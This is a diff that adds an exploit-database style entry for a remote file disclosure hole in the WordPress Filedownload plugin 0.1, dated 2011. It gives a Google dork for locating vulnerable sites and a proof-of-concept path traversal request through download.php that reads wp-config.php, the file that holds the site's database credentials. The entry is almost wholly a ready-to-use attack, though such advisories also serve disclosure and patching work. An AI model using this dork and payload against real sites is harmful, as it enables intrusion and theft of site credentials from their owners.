@@ -1,0 +1,22 @@
+WordPress Filedownload Plugin 0.1
+WordPress
+# Exploit Title: WordPress Filedownload Plugin 0.1 (download.php) Remote File Disclosure Vulnerability  
+
+# Google Dork: inurl:"/wp-content/plugins/filedownload/download.php/?path"  
+
+# Date: 18-09-2011  
+
+# Author: Septemb0x ( CYBER-WARRIOR )  
+
+# Software Link: http://plugins.svn.wordpress.org/filedownload/trunk/filedownload.php  
+
+# Version: 0.1  
+
+   
+
+   
+
+POC : /wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php  
+
+
+from: http://www.exploit-db.com/exploits/17858/ 
